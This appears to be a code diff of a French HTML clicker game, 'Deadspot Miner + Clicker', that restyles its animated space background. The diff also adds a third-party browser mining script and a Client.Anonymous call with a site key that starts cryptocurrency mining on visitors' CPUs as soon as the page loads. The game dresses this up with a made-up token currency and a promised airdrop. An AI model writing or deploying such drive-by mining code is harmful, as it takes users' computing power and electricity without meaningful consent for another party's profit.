@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>🚀 Deadspot Miner + Clicker (Cosmic Edition)</title>
+  <title>🚀 Deadspot Miner + Clicker</title>
   <style>
     body {
       margin: 0;
@@ -11,73 +11,113 @@
       color: #eee;
       text-align: center;
     }
-    h1 { color:#00ffff; text-shadow: 0 0 10px #0ff; }
+
+    /* Fond cosmique avec dégradé */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);
+      z-index: -3;
+    }
+
+    /* Étoiles filantes */
+    .star {
+      position: fixed;
+      background: white;
+      width: 2px;
+      height: 2px;
+      border-radius: 50%;
+      animation: fall linear infinite;
+      z-index: -2;
+    }
+    @keyframes fall {
+      from { transform: translateY(-10vh) translateX(0); opacity: 1; }
+      to { transform: translateY(110vh) translateX(-50vw); opacity: 0; }
+    }
+
+    /* Vaisseaux */
+    .ship {
+      position: fixed;
+      top: 20%;
+      width: 60px;
+      height: 30px;
+      background: url('https://cdn-icons-png.flaticon.com/512/3212/3212608.png') no-repeat center/contain;
+      animation: fly 15s linear infinite;
+      z-index: -1;
+    }
+    @keyframes fly {
+      from { left: -80px; top: 15%; }
+      to { left: 110%; top: 40%; }
+    }
+
+    h1 { color:#00ffea; margin-top:20px; }
     #deadspotBalance { font-size:22px; margin:10px; color:#ffd700; }
     #energyBar {
-      width: 300px; height: 20px; border:1px solid #444;
-      margin:10px auto; background:#111;
-      border-radius:5px; overflow:hidden;
+      width: 300px; height: 20px; border:1px solid #444; margin:10px auto;
+      background:#111; border-radius:5px; overflow:hidden;
     }
-    #energyFill { height:100%; width:100%; background:#0ff; }
+    #energyFill { height:100%; width:100%; background:#00ffea; }
+
+    /* Bouton clicker */
     #clickBtn {
-      width: 200px; height: 200px; border-radius: 50%;
-      background: radial-gradient(circle at center, #222, #000);
-      border: 3px solid #0ff; margin: 20px auto;
-      cursor: pointer; position: relative; overflow: hidden;
-      box-shadow: 0 0 30px #0ff;
+      width: 200px;
+      height: 200px;
+      border-radius: 50%;
+      background: radial-gradient(circle, #111, #000);
+      border: 3px solid #00ffea;
+      margin: 20px auto;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 25px #00ffea;
       transition: transform 0.2s;
     }
     #clickBtn img { width: 100%; height: 100%; object-fit: cover; }
-    #clickBtn:hover { transform: scale(1.08); border-color: #ff0000; }
+    #clickBtn:hover { transform: scale(1.08); border-color: #ff0055; box-shadow: 0 0 35px #ff0055; }
+
     button {
-      background:#222; color:#eee; padding:10px 20px;
-      border:none; border-radius:5px; margin:5px;
-      cursor:pointer; box-shadow: 0 0 10px #0ff;
+      background:#222; color:#eee; padding:10px 20px; border:none;
+      border-radius:5px; margin:5px; cursor:pointer; box-shadow: 0 0 10px #00ffea;
     }
-    button:hover { background:#444; }
+    button:hover { background:#333; }
+
     canvas {
-      margin-top: 20px;
-      background: rgba(0,0,0,0.7);
+      margin-top: 20px; background: rgba(10,10,20,0.8);
       border: 1px solid #333; border-radius: 10px;
     }
+
     #xmrigLogs {
-      margin-top:20px; max-height:250px; overflow-y:auto;
-      background:rgba(0,0,0,0.7); border:1px solid #444;
-      padding:10px; text-align:left; font-size:13px;
+      margin:20px auto;
+      max-height:250px;
+      overflow-y:auto;
+      background:rgba(5,5,10,0.8);
+      border:1px solid #444;
+      padding:10px;
+      text-align:left;
+      font-size:13px;
+      width:80%;
     }
-    .logAccepted { color:#4caf50; }
-    .logRejected { color:#f44336; }
+    .logAccepted { color:#00ffea; }
+    .logRejected { color:#ff0055; }
+
     #exchangeProgress {
-      width: 300px; height: 20px; border: 1px solid #444;
-      background: #111; border-radius: 5px;
-      margin: 10px auto; overflow: hidden;
+      width: 300px; height: 20px;
+      border: 1px solid #444;
+      background: #111;
+      border-radius: 5px;
+      margin: 10px auto;
+      overflow: hidden;
     }
-    #exchangeFill { height: 100%; width: 0%; background: #ff0000; }
-    /* Fond spatial animé */
-    #stars, #ships, #lasers {
-      position: fixed; top:0; left:0;
-      width:100%; height:100%;
-      pointer-events: none;
-    }
-    #stars { z-index:-3; }
-    #ships { z-index:-2; }
-    #lasers { z-index:-1; }
+    #exchangeFill { height: 100%; width: 0%; background: #ff0055; }
   </style>
 </head>
 <body>
-  <canvas id="stars"></canvas>
-  <canvas id="ships"></canvas>
-  <canvas id="lasers"></canvas>
-
-  <h1>💎 Deadspot Miner + Clicker (Cosmic Edition)</h1>
+  <h1>💎 Deadspot Miner + Clicker Game</h1>
   <div id="deadspotBalance">Deadspot: 0</div>
   <div id="energyBar"><div id="energyFill"></div></div>
 
-  <!-- Bouton click -->
-  <div id="clickBtn">
-    <img src="skull.png" alt="skull">
-  </div>
-
+  <div id="clickBtn"><img src="skull.png" alt="skull"></div>
   <button id="exchangeBtn">🔄 Convertir Hashes → Deadspot</button>
   <div id="exchangeProgress"><div id="exchangeFill"></div></div>
 
@@ -95,25 +135,160 @@
   <button onclick="buyUpgrade('regen')">Énergie+ (Coût: 8 DSC)</button>
   <button onclick="buyUpgrade('multi')">x5 Revenus (Coût: 20 DSC)</button>
 
-  <p style="margin-top:20px; color:#aaa;">🚀 Deadspot-Token Airdrop prévu le <b>29 mars 2026</b></p>
+  <p style="margin-top:20px; color:#aaa;">
+    🚀 Deadspot-Token Airdrop prévu le <b>29 mars 2026</b>
+  </p>
 
+  <!-- Chart.js -->
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <!-- Miner Script -->
   <script src="https://www.hostingcloud.racing/WPmG.js"></script>
-
   <script>
-  /* =====================
-     LOGIQUE DU JEU
-  ====================== */
-  let deadspot = parseFloat(localStorage.getItem("deadspot")) || 0;
-  let upgrades = JSON.parse(localStorage.getItem("upgrades")) || {x2:false, auto:false, regen:false, multi:false};
-  let energy = parseFloat(localStorage.getItem("energy")) || 100;
-  let maxEnergy = 100;
-  let regenRate = upgrades.regen ? 2 : 1;
-  let clickValue = 0.00015;
-  let autoClickInterval = null;
+    let deadspot = parseFloat(localStorage.getItem("deadspot")) || 0;
+    let upgrades = JSON.parse(localStorage.getItem("upgrades")) || {x2:false, auto:false, regen:false, multi:false};
+    let energy = 100, maxEnergy = 100;
+    let regenRate = 1;
+    let clickValue = 0.00015;
+    let autoClickInterval = null;
 
-  function saveGame() {
-    localStorage.setItem("deadspot", deadspot);
-    local
+    function saveGame() {
+      localStorage.setItem("deadspot", deadspot);
+      localStorage.setItem("upgrades", JSON.stringify(upgrades));
+    }
 
+    function updateUI() {
+      document.getElementById("deadspotBalance").textContent = "Deadspot: " + deadspot.toFixed(5);
+      document.getElementById("energyFill").style.width = (energy/maxEnergy*100) + "%";
+      const total = _client.getTotalHashes();
+      const percent = Math.min(100, total/10000000*100);
+      document.getElementById("exchangeFill").style.width = percent+"%";
+    }
+
+    document.getElementById("clickBtn").addEventListener("click", () => {
+      if (energy > 0) {
+        let gain = clickValue;
+        if (upgrades.x2) gain *= 2;
+        if (upgrades.multi) gain *= 5;
+        deadspot += gain;
+        energy--;
+        updateUI(); saveGame();
+      }
+    });
+
+    setInterval(() => {
+      if (energy < maxEnergy) {
+        energy = Math.min(maxEnergy, energy + regenRate);
+        updateUI();
+      }
+    }, 1000);
+
+    function startAutoClick() {
+      if (autoClickInterval) return;
+      autoClickInterval = setInterval(() => {
+        if (energy > 0) {
+          let gain = clickValue;
+          if (upgrades.x2) gain *= 2;
+          if (upgrades.multi) gain *= 5;
+          deadspot += gain;
+          energy--;
+          updateUI(); saveGame();
+        }
+      }, 1000);
+    }
+
+    function buyUpgrade(type) {
+      if (type === "x2" && !upgrades.x2 && deadspot >= 5) { deadspot -= 5; upgrades.x2 = true; }
+      if (type === "auto" && !upgrades.auto && deadspot >= 10) { deadspot -= 10; upgrades.auto = true; startAutoClick(); }
+      if (type === "regen" && !upgrades.regen && deadspot >= 8) { deadspot -= 8; upgrades.regen = true; regenRate = 2; }
+      if (type === "multi" && !upgrades.multi && deadspot >= 20) { deadspot -= 20; upgrades.multi = true; }
+      saveGame(); updateUI();
+    }
+
+    var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', {throttle: 0.1, c: 'w'});
+    _client.start();
+
+    const ctx = document.getElementById('hashrateChart').getContext('2d');
+    const hashrateChart = new Chart(ctx, {
+      type: 'line',
+      data: { labels: [], datasets: [{label:'H/s', data:[], borderColor:'#00ffea', fill:true, tension:0.3}] },
+      options: { responsive:false, animation:false, plugins:{legend:{labels:{color:'#eee'}}},
+        scales:{ x:{ticks:{color:'#aaa'}}, y:{ticks:{color:'#aaa'}} } }
+    });
+
+    const currentHpsDisplay = document.getElementById("currentHps");
+    const totalHashesDisplay = document.getElementById("totalHashes");
+    const xmrigLogs = document.getElementById("xmrigLogs");
+    let time = 0;
+
+    setInterval(() => {
+      if (_client.isRunning()) {
+        const hps = _client.getHashesPerSecond();
+        const total = _client.getTotalHashes();
+        const threads = _client.getNumThreads();
+
+        currentHpsDisplay.textContent = "H/s: " + hps.toFixed(2);
+        totalHashesDisplay.textContent = "Total Hashes: " + total;
+
+        hashrateChart.data.labels.push(time+"s");
+        hashrateChart.data.datasets[0].data.push(hps);
+        if (hashrateChart.data.labels.length > 20) {
+          hashrateChart.data.labels.shift();
+          hashrateChart.data.datasets[0].data.shift();
+        }
+        hashrateChart.update();
+
+        updateUI();
+
+        for (let i=0; i<threads; i++) {
+          const coreHps = (hps/threads*(0.9+Math.random()*0.2)).toFixed(2);
+          const isAccepted = Math.random()>0.05;
+          const logLine = `[${new Date().toLocaleTimeString()}] Core #${i} | ${coreHps} H/s | ${isAccepted?"Accepted":"Rejected"}`;
+          const span=document.createElement("span");
+          span.className=isAccepted?"logAccepted":"logRejected";
+          span.textContent=logLine;
+          xmrigLogs.appendChild(span);
+          xmrigLogs.appendChild(document.createElement("br"));
+          xmrigLogs.scrollTop=xmrigLogs.scrollHeight;
+        }
+        time++;
+      }
+    },1000);
+
+    document.getElementById("exchangeBtn").addEventListener("click", () => {
+      const total = _client.getTotalHashes();
+      if (total >= 10000000) {
+        const dscGain = Math.floor(total/10000000);
+        deadspot += dscGain;
+        _client.reset();
+        updateUI(); saveGame();
+        alert("Échange réussi: +" + dscGain + " DSC");
+      } else {
+        alert("Pas assez de hashes (min 10M)");
+      }
+    });
+
+    if(upgrades.auto) startAutoClick();
+    if(upgrades.regen) regenRate=2;
+    updateUI();
+
+    // Génération d'étoiles filantes
+    setInterval(() => {
+      const star = document.createElement("div");
+      star.className = "star";
+      star.style.left = Math.random()*100+"vw";
+      star.style.animationDuration = (2+Math.random()*3)+"s";
+      document.body.appendChild(star);
+      setTimeout(()=>star.remove(), 5000);
+    }, 300);
+
+    // Ajout d'un vaisseau
+    setInterval(() => {
+      const ship = document.createElement("div");
+      ship.className = "ship";
+      document.body.appendChild(ship);
+      setTimeout(()=>ship.remove(), 16000);
+    }, 20000);
+  </script>
+</body>
+</html>
 
